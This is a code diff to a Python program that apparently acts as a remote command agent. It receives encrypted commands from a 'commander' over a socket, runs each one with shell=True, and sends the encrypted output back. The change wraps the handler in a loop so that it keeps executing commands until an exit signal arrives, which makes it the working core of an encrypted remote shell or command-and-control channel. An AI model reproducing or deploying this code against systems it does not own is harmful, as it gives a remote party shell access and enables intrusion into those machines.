@@ -293,22 +293,26 @@ if __name__ == '__main__':
                     print(constants.CLIENT_RESPONSE.format(constants.RUN_PROGRAM_SIGNAL))
 
                     # Receive command from the server
-                    print(constants.COMMAND_WAIT_MSG)
-                    command = decrypt_string(client_socket.recv(1024).decode(), shared_secret)
-                    if command.lower() == constants.EXIT_RUN_PROGRAM_SIGNAL:
-                        print(constants.COMMANDER_QUIT)
-                        print(constants.AWAIT_NEXT_OP_MSG)
-                        print(constants.MENU_CLOSING_BANNER)
-                        break
+                    while True:
+                        print(constants.COMMAND_WAIT_MSG)
+                        command = decrypt_string(client_socket.recv(1024).decode(), shared_secret)
+                        print(constants.EXECUTING_COMMAND_MSG.format(command))
 
-                    # Use subprocesses to execute command and return output as (string)
-                    try:
-                        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
-                    except Exception as e:
-                        result = str(e)
+                        if command.lower() == constants.EXIT_RUN_PROGRAM_SIGNAL:
+                            print(constants.COMMANDER_QUIT)
+                            print(constants.AWAIT_NEXT_OP_MSG)
+                            print(constants.MENU_CLOSING_BANNER)
+                            break
 
-                    # Return result back to the commander
-                    client_socket.send(encrypt_string(result, shared_secret).encode())
+                        # Use subprocesses to execute command and return output as (string)
+                        try:
+                            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+                            print(result)
+                        except Exception as e:
+                            result = str(e)
+
+                        # Return result back to the commander
+                        client_socket.send(encrypt_string(result, shared_secret).encode())
 
         except ConnectionResetError:
             print("[+] The client {}:{} disconnected unexpectedly.".format(client_address[0], client_address[1]))
